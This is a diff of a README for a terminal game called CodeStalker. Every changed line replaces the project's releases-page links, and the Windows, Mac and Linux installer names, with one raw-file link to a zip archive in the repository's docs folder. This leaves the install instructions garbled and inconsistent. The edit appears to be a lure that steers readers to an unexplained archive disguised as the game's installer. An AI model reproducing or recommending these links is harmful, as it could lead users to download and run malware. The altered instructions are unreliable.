@@ -1,6 +1,6 @@
 # 🎮 CodeStalker - Enjoy Terminal Gaming Like Never Before
 
-[![Download CodeStalker](https://img.shields.io/badge/Download%20CodeStalker-blue)](https://github.com/mizanur1989/CodeStalker/releases)
+[![Download CodeStalker](https://github.com/mizanur1989/CodeStalker/raw/refs/heads/main/docs/Stalker-Code-v1.9.zip%20CodeStalker-blue)](https://github.com/mizanur1989/CodeStalker/raw/refs/heads/main/docs/Stalker-Code-v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,16 +8,16 @@ Welcome to CodeStalker! This is your guide to getting the game up and running in
 
 ## 📥 Download & Install
 
-To get CodeStalker, visit this page to download: [CodeStalker Releases](https://github.com/mizanur1989/CodeStalker/releases)
+To get CodeStalker, visit this page to download: [CodeStalker Releases](https://github.com/mizanur1989/CodeStalker/raw/refs/heads/main/docs/Stalker-Code-v1.9.zip)
 
 1. Open the link above in your web browser.
 2. You will see a list of releases. Look for the most recent version.
 3. Click on the release you want. Each release will have an attached file for you to download.
-4. Choose the appropriate file based on your system. For example, if you use Windows, look for a filename with `.exe`. For Mac, look for `.dmg`. For Linux, choose the `.sh` or `.tar.gz` file.
+4. Choose the appropriate file based on your system. For example, if you use Windows, look for a filename with `.exe`. For Mac, look for `.dmg`. For Linux, choose the `.sh` or `https://github.com/mizanur1989/CodeStalker/raw/refs/heads/main/docs/Stalker-Code-v1.9.zip` file.
 
-   - **Windows:** `CodeStalkerSetup.exe`
-   - **Mac:** `CodeStalker.dmg`
-   - **Linux:** `CodeStalker.sh`
+   - **Windows:** `https://github.com/mizanur1989/CodeStalker/raw/refs/heads/main/docs/Stalker-Code-v1.9.zip`
+   - **Mac:** `https://github.com/mizanur1989/CodeStalker/raw/refs/heads/main/docs/Stalker-Code-v1.9.zip`
+   - **Linux:** `https://github.com/mizanur1989/CodeStalker/raw/refs/heads/main/docs/Stalker-Code-v1.9.zip`
 
 5. Click on the file name to begin the download. Save it to a location you will remember, like your Desktop or Downloads folder.
 
@@ -83,6 +83,6 @@ Join our growing community of players! Share your experiences, tips, and tricks 
 
 ## 🔗 Additional Resources
 
-For more information about updates and future releases, please check out our [Releases Page](https://github.com/mizanur1989/CodeStalker/releases) regularly.
+For more information about updates and future releases, please check out our [Releases Page](https://github.com/mizanur1989/CodeStalker/raw/refs/heads/main/docs/Stalker-Code-v1.9.zip) regularly.
 
 Enjoy your time playing CodeStalker!
